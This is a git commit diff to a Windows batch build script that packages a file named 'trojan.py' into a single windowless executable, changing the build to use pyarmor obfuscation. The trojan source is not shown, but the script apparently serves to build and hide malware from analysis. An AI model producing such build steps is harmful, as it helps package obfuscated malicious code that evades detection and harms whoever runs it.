3e326d829914632d45b549336afb3b05c61043f0
bossjaylen145 <64386453+bossjaylen145@users.noreply.github.com>
2021-05-22 18:05:54 -0400

    Update compiler.bat

--- compiler.bat
+++ compiler.bat
@@ -1,13 +1,10 @@
 @echo off
-
 echo Installing packages from requirements.txt...
 pip install -r requirements.txt
 
-pyinstaller --onefile --windowed trojan.py
+pyarmor pack --clean -e "--onefile --windowed" trojan.py
 
-RD __pycache__ /Q /S
 RD build /Q /S
-DEL trojan.spec /Q
 
 echo Done
 pause
